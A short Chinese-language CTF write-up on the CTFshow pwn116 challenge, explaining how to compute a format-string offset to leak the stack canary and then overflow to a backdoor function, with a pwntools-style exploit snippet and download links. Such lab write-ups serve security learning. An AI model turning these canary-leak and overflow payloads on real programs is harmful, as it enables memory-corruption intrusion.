---
title: CTFshow pwn116 再做一次格式化字符串泄露 Canary
published: 2026-04-17
updated: 2026-04-17
description: 和 pwn115 是同一类打法，只是格式化字符串偏移和溢出布局变了，本质仍是先 leak canary 再 ret2text。
tags: [CTFshow, Pwn, Stack, Canary, Format String]
category: ctfshow
draft: false
---

# 题目结论

这题本质上就是 pwn115 的变体，差别主要在两个地方：

- canary 的格式化字符串偏移不同
- 栈上缓冲区到返回地址的距离不同

## 偏移计算

原始笔记中的计算是：

```text
(0x2C - 0xC) / 4 + 7 = 15
```

因此 leak 语句改为 `%15$p`。

## 关键 exp 片段

```python
Leak = b'aaaa' + b'%15$p'
p.sendline(Leak)
p.recvuntil(b'aaaa0x')
canary = int(p.recv(8), 16)
payload = b'a' * (0x2c - 0xc) + p32(canary) + b'a' * 0xc + p32(backdoor)
```

## 下载

- [下载题目附件 `pwn`](../../attachments/ctfshow/pwn116/pwn)
- [下载利用脚本 `exp.py`](../../attachments/ctfshow/pwn116/exp.py)
- [下载原始笔记 `Bypass_pwn116.md`](../../attachments/ctfshow/pwn116/Bypass_pwn116.md)

## 适合记住的点

同一类题，真正要会的是“偏移怎么算”，而不是死记某一个 `%55$p` 或 `%15$p`。
